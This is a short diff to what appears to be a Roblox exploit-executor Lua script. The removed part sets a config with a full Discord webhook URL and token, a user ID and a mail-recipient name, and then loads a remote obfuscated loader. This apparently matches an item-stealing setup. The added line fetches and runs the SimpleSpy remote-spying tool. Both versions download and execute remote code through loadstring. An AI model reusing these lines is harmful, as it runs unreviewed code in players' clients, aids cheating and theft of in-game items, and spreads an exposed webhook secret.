@@ -1,6 +1,1 @@
-getgenv().Config = {
-    ["Webhook"] = "https://discord.com/api/webhooks/1362197419898699947/XEQcIfzX8x1ElwhoSlka64lNsvCcMzQZwDRiRFrBcGrCANeZvF_9V-WGjPWjn8Ca1axp",
-    ["UserID"] = "484739592239579136",
-    ["MailUsers"] = {"comer_item"},
-}
-loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/e43eeb29211cc04ff3dad8003ed8deaa.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua"))()
